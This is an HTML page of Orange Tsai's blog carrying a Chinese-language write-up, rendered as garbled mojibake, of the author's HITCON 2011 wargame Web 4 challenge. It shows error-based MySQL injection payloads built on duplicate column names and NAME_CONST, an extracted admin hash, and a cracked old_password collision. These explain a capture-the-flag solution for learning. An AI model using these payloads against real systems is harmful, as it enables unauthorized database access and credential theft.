<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="DEBUG å¿ƒå¾—æ˜¯ç¾åœ¨å¤§å¤šæ•¸çš„äººå°æ–¼SQL injection (Mysql)éƒ½æ˜¯unionåŠ ä¸Šinformation_schemaå–å¾—è³‡æ–™ï¼Œä½†æ˜¯ä¸¦ä¸æ˜¯é‚£éº¼çš„ç°¡å–®ï¼ŒSQL injectionå…¶å¯¦æ˜¯ä¸€é–€éå¸¸æ·±çš„å­¸å•ï¼Œå°±å‡ºäº†é€™é¡ŒXD é€™å€‹æ–¹æ³•æœ€æ—©æ˜¯åœ¨å¤§é™¸çš„æ–‡ç« çœ‹åˆ°ï¼Œå¾Œä¾†æœ‰åˆ†æåˆ°åœ‹å¤–çš„ä¸€å¥—SQLè‡ªå‹•åŒ–æ”»æ“Šå·¥å…·havijï¼Œè£¡é¢ä¹Ÿæœ‰ç”¨åˆ°é¡ä¼¼çš„æ–¹å¼ã€‚ ä¸€å€‹ç™»å…¥ä»‹é¢ï¼Œé¡Œç›®æ˜¯  If you can login,">
<meta property="og:type" content="article">
<meta property="og:title" content="å°ç£é§­å®¢å¹´æœƒ HITCON2011ï¼ŒWargame Web 4å‡ºé¡Œå¿ƒå¾— &amp; è§£æ³•">
<meta property="og:url" content="https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-4/index.html">
<meta property="og:site_name" content="Orange Tsai">
<meta property="og:description" content="DEBUG å¿ƒå¾—æ˜¯ç¾åœ¨å¤§å¤šæ•¸çš„äººå°æ–¼SQL injection (Mysql)éƒ½æ˜¯unionåŠ ä¸Šinformation_schemaå–å¾—è³‡æ–™ï¼Œä½†æ˜¯ä¸¦ä¸æ˜¯é‚£éº¼çš„ç°¡å–®ï¼ŒSQL injectionå…¶å¯¦æ˜¯ä¸€é–€éå¸¸æ·±çš„å­¸å•ï¼Œå°±å‡ºäº†é€™é¡ŒXD é€™å€‹æ–¹æ³•æœ€æ—©æ˜¯åœ¨å¤§é™¸çš„æ–‡ç« çœ‹åˆ°ï¼Œå¾Œä¾†æœ‰åˆ†æåˆ°åœ‹å¤–çš„ä¸€å¥—SQLè‡ªå‹•åŒ–æ”»æ“Šå·¥å…·havijï¼Œè£¡é¢ä¹Ÿæœ‰ç”¨åˆ°é¡ä¼¼çš„æ–¹å¼ã€‚ ä¸€å€‹ç™»å…¥ä»‹é¢ï¼Œé¡Œç›®æ˜¯  If you can login,">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-4/96ac50d31b1ce6f3-01.png">
<meta property="og:image" content="https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-4/33b64799b36b3a52-02.png">
<meta property="og:image" content="https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-4/02769224b3473ada-03.png">
<meta property="og:image" content="https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-4/14993b5a740d538e-04.png">
<meta property="og:image" content="https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-4/480ed4d60e1eefe5-05.png">
<meta property="og:image" content="https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-4/8b2d7173f5e02dd5-06.png">
<meta property="og:image" content="https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-4/73e2f421d19ba1bf-07.png">
<meta property="og:image" content="https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-4/03157dc04a3e4907-08.png">
<meta property="article:published_time" content="2011-07-23T16:00:00.000Z">
<meta property="article:modified_time" content="2024-08-21T03:13:22.975Z">
<meta property="article:author" content="Orange Tsai">
<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-4/96ac50d31b1ce6f3-01.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    
      <title>å°ç£é§­å®¢å¹´æœƒ HITCON2011ï¼ŒWargame Web 4å‡ºé¡Œå¿ƒå¾— &amp; è§£æ³• | Orange Tsai</title>
    
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-13047966-1');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Orange Tsai" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
    <div class="content index py4 ">
        
          <header id="header">
  <a class="u-url u-uid" href="/">
  
    
      <img id="logo" alt class="u-logo" src="/images/logo.png" />
    
  
    <div id="title">
      <h1 class="p-name">Orange Tsai</h1>
    </div>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
      </li>
      <!--
     --><li><a href="/">Home</a></li><!--
   --><!--
     --><li><a href="/articles/">Articles</a></li><!--
   --><!--
     --><li><a href="/talks/">Talks</a></li><!--
   --><!--
     --><li><a href="/about/">About</a></li><!--
   -->
    </ul>
  </div>
</header>

        

        
          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
        

        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        å°ç£é§­å®¢å¹´æœƒ HITCON2011ï¼ŒWargame Web 4å‡ºé¡Œå¿ƒå¾— &amp; è§£æ³•
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">ğŸŠ <a href='/about'>Orange Tsai</a></span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2011-07-23T16:00:00.000Z" class="dt-published" itemprop="datePublished">2011-07-24</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><a href="https://blog.orange.tw//2011/07/hitcon2011wargame-web-4.html">DEBUG</a></p>
<p>å¿ƒå¾—æ˜¯ç¾åœ¨å¤§å¤šæ•¸çš„äººå°æ–¼SQL injection (Mysql)éƒ½æ˜¯unionåŠ ä¸Šinformation_schemaå–å¾—è³‡æ–™ï¼Œä½†æ˜¯ä¸¦ä¸æ˜¯é‚£éº¼çš„ç°¡å–®ï¼ŒSQL injectionå…¶å¯¦æ˜¯ä¸€é–€éå¸¸æ·±çš„å­¸å•ï¼Œå°±å‡ºäº†é€™é¡ŒXD</p>
<p>é€™å€‹æ–¹æ³•æœ€æ—©æ˜¯åœ¨å¤§é™¸çš„æ–‡ç« çœ‹åˆ°ï¼Œå¾Œä¾†æœ‰åˆ†æåˆ°åœ‹å¤–çš„ä¸€å¥—SQLè‡ªå‹•åŒ–æ”»æ“Šå·¥å…·havijï¼Œè£¡é¢ä¹Ÿæœ‰ç”¨åˆ°é¡ä¼¼çš„æ–¹å¼ã€‚</p>
<p>ä¸€å€‹ç™»å…¥ä»‹é¢ï¼Œé¡Œç›®æ˜¯</p>
<blockquote>
<p>If you can login, You can get the key.</p>
</blockquote>
<p>ç™»å…¥ç•«é¢</p>
<p><img src="/posts/2011-07-hitcon2011wargame-web-4/96ac50d31b1ce6f3-01.png"></p>
<p>å¯ä»¥æ˜é¡¯ç™¼ç¾ç¢ºèªä½¿ç”¨è€…çš„é é¢å­˜åœ¨SQL injection</p>
<p><img src="/posts/2011-07-hitcon2011wargame-web-4/33b64799b36b3a52-02.png"></p>
<p>ä¹Ÿå¯ä»¥ç™¼ç¾</p>
<ul>
<li>ä¸èƒ½ä½¿ç”¨ <code>union</code>  â€“&gt; å› ç‚ºåªæœƒé¡¯ç¤º True or Falseï¼Œä¸å¯èƒ½åˆ—å‡ºä»»ä½•è³‡è¨Š</li>
<li>ä¸èƒ½ä½¿ç”¨ <code>Information_schema</code> â€“&gt; å‡æƒ³ç’°å¢ƒæ˜¯åœ¨mysql4ä¸Šé¢é‹è¡Œï¼Œåœ¨Mysql4ä»¥å‰æ²’æœ‰é€™å€‹è³‡æ–™åº«ï¼Œé€™é¡Œæ˜¯æˆ‘è‡ªå·±patch mysqlä¸»ç¨‹å¼æ‰€ä»¥ä½¿ç”¨ä¸äº†<code>information_schema</code>æŸ¥table nameä»¥åŠcolumn name</li>
<li>ä¸èƒ½ä½¿ç”¨blind injection or time base injection  â€“&gt; å› ç‚ºç„¡æ³•å–å¾—column nameä¸èƒ½å–å¾—è³‡æ–™</li>
</ul>
<p>ä½†æ˜¯ï¼Œç™¼ç¾ä»–æ˜¯Error baseçš„Injectionã€‚ å¯ä»¥åˆ©ç”¨Duplicate column nameçš„æ–¹å¼ä¾†æ³¨å…¥</p>
<p>Example:</p>
<p>åœ¨Mysql Commandlineä¸‹è¼¸å…¥ï¼š</p>
<blockquote>
<p>Select * from (Select 1,1) as a</p>
</blockquote>
<p>æœƒé¡¯ç¤º</p>
<blockquote>
<p>ERROR 1060 (42S21): Duplicate column name â€˜1â€™</p>
</blockquote>
<p>åˆ©ç”¨Error baseçš„æ–¹å¼åƒSQL serverä¸€æ¨£å¯ä»¥æŠŠæƒ³è¦çš„è³‡æ–™å‡ºç¾åœ¨éŒ¯èª¤è¨Šæ¯ä¸­ã€‚ ä½†æ˜¯è¦åˆ©ç”¨é€™å€‹çˆ†å‡ºéCONSTä»¥å¤–çš„é‚„éœ€è¦é…åˆ<code>NAME_CONST</code>é€™å€‹å‡½æ•¸ä¾†é”æˆ</p>
<p><img src="/posts/2011-07-hitcon2011wargame-web-4/02769224b3473ada-03.png"></p>
<p>ä½†æ˜¯<code>NAME_CONST</code>åœ¨Mysql 5.1å¾Œè¢«Updateäº†ä¸èƒ½ä½¿ç”¨éå¸¸é‡CONSTä»¥å¤–çš„åƒæ•¸ï¼Œä½†æ˜¯é‚„æ˜¯æœ‰å…¶ä»–çš„æ–¹æ³•çš„ï¼Œæœ‰èˆˆè¶£å¯ä»¥è‡ªå·±å»Googleé€™è£¡å°±ä¸è©³è«‡äº† :P</p>
<p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨ä»¥ä¸‹çš„æ–¹å¼çˆ†å‡º Column name</p>
<blockquote>
<p>id&#x3D;testâ€™ and (Select * from (Select * from users as a join users as b) as c) and â€˜â€™&#x3D;â€™</p>
</blockquote>
<blockquote>
<p>id&#x3D;testâ€™ and (Select * from (Select * from users as a join users as b using(column name)) as c) and â€˜â€™&#x3D;â€™</p>
</blockquote>
<p><img src="/posts/2011-07-hitcon2011wargame-web-4/14993b5a740d538e-04.png"></p>
<p><img src="/posts/2011-07-hitcon2011wargame-web-4/480ed4d60e1eefe5-05.png"></p>
<p>å¯ä»¥å¾—åˆ°Column name</p>
<blockquote>
<p>wpw_d7862549d4ed8f82</p>
</blockquote>
<p>ç¹¼çºŒåˆ©ç”¨<code>NAME_CONST</code>çˆ†å‡ºå…¶ä¸­çš„è³‡æ–™</p>
<p><img src="/posts/2011-07-hitcon2011wargame-web-4/8b2d7173f5e02dd5-06.png"></p>
<p><img src="/posts/2011-07-hitcon2011wargame-web-4/73e2f421d19ba1bf-07.png"></p>
<p>å¯ä»¥å–å¾—</p>
<blockquote>
<p>admin &#x2F; 0b79f46808458afb</p>
</blockquote>
<p>åœ¨ç™»å…¥é é¢çš„åœ°æ–¹ä¹Ÿå¯ä»¥ç™¼ç¾è¼¸å…¥å–®å¼•è™Ÿä¹Ÿæœƒé¡¯ç¤ºSQL errorï¼Œä»”ç´°è§€å¯Ÿæœƒç™¼ç¾æ˜¯ä½¿ç”¨Mysqlçš„<code>old_password</code>ä¾†å°å¯†ç¢¼é€²è¡ŒåŠ å¯†ã€‚</p>
<p><img src="/posts/2011-07-hitcon2011wargame-web-4/03157dc04a3e4907-08.png"></p>
<p>åœ¨Mysql4ä»¥å‰passwordå„²å­˜çš„æ–¹å¼æ˜¯é€éold_passwordé€™å€‹å‡½æ•¸é€²è¡ŒåŠ å¯†çš„ï¼Œå¯¦éš›ä¸Šé€™å€‹åŠ å¯†æ–¹å¼å­˜åœ¨å¼±é»èƒ½è¢«å¾ˆå¿«é€Ÿçš„ç¢°æ’(Collision)å‡ºä¾†ï¼Œç¶²è·¯ä¸Šå¯ä»¥æ‰¾åˆ°ç¾æˆçš„å·¥å…·ï¼Œç´„20~30åˆ†é˜å¯ä»¥æ’å‡ºä¸€çµ„hashå€¼èˆ‡ä¸Šé¢ä¸€æ¨£çš„å¯†ç¢¼</p>
<p>æˆ‘è‡ªå·±ç¢°æ’çš„çµæœæ˜¯é€™çµ„</p>
<blockquote>
<p>Select old_password(â€˜!H6~a&#96;â€~H\DN&gt;â€™);</p>
</blockquote>
<p>å‡ºä¾†çš„çµæœèˆ‡ä¸Šé¢çš„hashå€¼æ˜¯ä¸€æ¨£çš„ï¼Œæ‰€ä»¥ä½¿ç”¨ admin &#x2F; !H6~a`&quot;~H\DN&gt; å³å¯ç™»å…¥å–å¾—Keyã€‚</p>
<p>:P è§£é¡Œæ„‰å¿«XD æ²’è§£å‡ºä¾†è‡³å°‘æœ‰å­¸åˆ°æ–°æ±è¥¿å§ :P</p>
<p>æœ‰æ©Ÿæœƒå†æŠŠå‡ºçš„å¦å¤–ä¸€é¡ŒWebä»¥åŠWindows Binaryè§£é¡Œéç¨‹å¯«å‡ºXD</p>

  </div>
</article>



        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2009-2024
    Orange Tsai
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/articles/">Articles</a></li><!--
     --><!--
       --><li><a href="/talks/">Talks</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
